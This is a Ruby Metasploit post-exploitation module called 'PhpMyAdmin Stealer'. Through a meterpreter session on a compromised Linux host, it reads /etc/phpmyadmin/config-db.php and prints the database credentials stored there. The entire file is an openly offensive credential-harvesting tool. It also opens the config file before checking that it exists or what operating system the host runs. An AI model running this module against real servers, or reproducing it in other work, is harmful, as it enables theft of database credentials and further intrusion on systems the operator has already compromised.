
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex'
require 'msf/core'
require 'msf/core/post/common'

#
# Metasploit Class name and mixins ..
#
class MetasploitModule < Msf::Post
      Rank = AverageRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'PhpMyAdmin Stealer',
                        'Description'   => %q{This module gathers PhpMyAdmin Creds from Target Linux machine.},
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        => ['bofheaded'], # post-module author :D
 
                        'Version'        => 'N\\A',
                        'DisclosureDate' => '08-07-2018',
                        'Platform'       => 'linux',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'true',  # root privileges required?
                        'References'     =>
                                [
                                         [ 'URL', 'https://www.centos.org/forums/viewtopic.php?t=50898' ]
                                ],
			'DefaultOptions' =>
				{
					'SESSION' => '1',   # Default its to run againts session 1
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on'])
                        ], self.class)

        end
        def run
            print_line("\n=================")
            print_line("PhpMyAdmin Stealer")
            print_line("===================\n")
            oscheck = client.fs.file.expand_path("%OS%")
            conf_path= "/etc/phpmyadmin/config-db.php"
            read_conf = client.fs.file.new(conf_path)
            if oscheck == "Windows_NT"
                print_error("This Module is not Compatible with Windows")
                return nil
            end
            if client.fs.file.exist?(conf_path)
                print_good('PhpMyAdmin config found!')
                print_good("Extracting Creds\n")
                Rex::sleep(2.0)
                print_line(read_conf.read)
            else
                vprint_error("#{conf_path} doesn't exist on target")
                return nil
        end
    end
end